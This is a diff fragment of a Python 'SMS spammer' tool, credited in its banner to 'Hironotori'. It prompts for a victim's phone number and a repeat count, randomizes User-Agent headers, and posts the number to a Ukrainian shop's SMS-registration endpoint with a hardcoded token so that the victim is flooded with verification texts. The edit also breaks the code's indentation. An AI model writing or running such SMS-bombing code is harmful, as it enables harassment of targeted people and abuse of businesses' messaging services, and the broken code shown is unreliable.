@@ -29,7 +29,8 @@ def generate_info():
     _email = _name + '@gmail.com'
     email = _email
 
-
+user = fake_useragent.UserAgent().random
+headers = {'user_agent' : user}
 console.print('''[bold red]
  -----------------------------------------
 | Создатель - Hironotori                  |
@@ -46,8 +47,7 @@ self.formatted_phone = console.input("[blue]spammer>> ")
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 
 def ukr():
-        for _ in track(range(run)):
-                headers = {"User-Agent": fake_useragent.UserAgent().random}
+for _ in track(range(run)):
  try:
      print('мазайкааа')
      requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
